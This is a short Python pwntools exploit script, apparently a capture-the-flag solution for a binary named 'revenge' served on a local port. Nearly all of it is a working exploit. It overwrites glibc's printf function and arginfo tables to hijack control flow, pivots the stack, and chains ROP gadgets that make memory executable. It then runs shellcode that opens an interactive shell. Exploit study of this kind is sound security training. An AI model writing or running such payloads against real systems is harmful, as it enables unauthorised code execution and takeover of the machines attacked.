#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

BINARY = './revenge'
TARGET = ('127.0.0.1', 2333)

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY)
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

code = ELF(BINARY)

#attach(0x000000000046B9A8)

p  = '' 
p += '\x00'*(115*8)
p += p64(0x46B9A8)                              # *__printf_arginfo_table[spec->info.spec]
p += '\x00'*(0x4e0-len(p))
p += p64(0x00000000004a1a79) # xchg eax,esp ; ret # _dl_wait_lookup_done
p += '\x00'*(0x530-len(p))
p += p64(0x6B7918) #_dl_scope_free_list
p += p64(0x00000000006b7928) # new stack
p += p64(0xdeadbeaf)
p += p64(0x400525) #  pop rdi
p += p64(0x6b7000) 
p += p64(0x4059d6) # pop rsi
p += p64(0x1000)
p += p64(0x435435) # pop rdx
p += p64(7)
p += p64(0x4340A0)
p += p64(0x6b7968)
p += asm(shellcraft.amd64.sh())
p += p64(0x6b79)
p += '\x00'*(0x648-len(p))
p += p64(0x1)                                        #__printf_function_table
p += '\x00'*(1736-len(p))
p += p64(0x6b73e0)                                # __printf_arginfo_table
r.send(p + "\n")
r.interactive()
#attach(0x400a32)
    
